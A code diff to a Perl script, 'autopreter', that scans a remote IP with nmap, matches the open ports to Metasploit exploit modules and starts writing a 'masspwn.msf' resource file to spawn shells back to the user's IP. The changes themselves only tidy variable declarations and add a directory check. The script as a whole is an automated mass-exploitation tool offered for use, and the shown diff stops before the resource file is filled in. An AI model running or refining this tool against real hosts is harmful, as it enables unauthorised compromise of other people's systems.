@@ -1,4 +1,11 @@
 #!/usr/bin/perl
+use strict;
+use Cwd qw();
+my $path = Cwd::cwd();
+if ($path !~ m/metasploit/) {
+  print ("Your current working directory must be metasploit's.\n");
+  exit(1);
+}
 print("autopreter by oxagast\n");
 if($#ARGV < 1) {
   print("Useage: ./autopreter.pl <remoteip> <yourip>\n\n");
@@ -12,16 +19,20 @@ if(`id` !~ m/root/) {
   print("Must be run as root on the local machine.\n");
   exit(1);
 }
-$lhost = @ARGV[1];
-$rhost = @ARGV[0];
+my $lhost = $ARGV[1];
+my $rhost = $ARGV[0];
 print("trying to spawn a shell from $rhost...\n");
 unlink("masspwn.nmap");
 unlink("masspwn.msf");
 system("nmap $rhost -O -oG masspwn.nmap >/dev/null");
-$nms = `cat masspwn.nmap`;
+my $nms = `cat masspwn.nmap`;
+my @nmap;
 @nmap = split("\n", $nms);
 @nmap[1] =~ m/Host: (\d+\.\d+\.\d+\.\d+)/;
 $rhost = $1;
+my @port;
+my @nport;
+my @modules;
 @port = split("/open", @nmap[2]);
 @port[0] =~ s/.*Ports: //;
 push(@nport, @port[0]);
@@ -30,14 +41,15 @@ foreach (@port) {
   push(@nport, $1);
 }
 foreach(@nport) {
-  $curport = $_;
-  @moduledir = `grep RPORT modules/ -R | grep \\($curport\\) | grep exploit`;
+  my $curport = $_;
+  my @moduledir = `grep RPORT modules/ -R | grep \\($curport\\) | grep exploit`;
   foreach(@moduledir) {
-    $curmod = $_;
+    my $curmod = $_;
     $curmod =~ m/.*\/(exploit.*)\.rb\:.*/;
     push(@modules, $1);
   }
 }
+my @umods;
 my %seen;
 foreach my $value (@modules) {
   if (! $seen{$value}) {
@@ -46,9 +58,10 @@ foreach my $value (@modules) {
   }
 }
 @nmap[2] =~ m/.*OS: (\w+) /;
-$os = $1;
-$los = lc($os);
-$handler = 2000;;
+my $os = $1;
+my $los = lc($os);
+my$handler = 2000;;
+my $fh;
 open($fh, ">", "masspwn.msf");
 foreach(@umods) {
   $handler++;
